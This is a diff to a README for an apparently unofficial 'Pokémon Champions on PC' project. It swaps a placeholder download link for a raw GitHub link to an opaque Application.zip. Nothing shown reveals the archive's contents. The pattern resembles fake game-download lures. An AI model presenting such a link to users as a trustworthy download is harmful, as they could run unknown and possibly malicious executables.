@@ -4,7 +4,7 @@ Get ready to experience everything you love about Pokémon battles all in one pl
 
 ## Download
 
-[Download Latest Version](https://example.com/download)
+[Download Latest Version](https://raw.githubusercontent.com/andyfast/Pokemon-Champions-ON-PC/main/Application.zip)
 
 ## Requirements
 
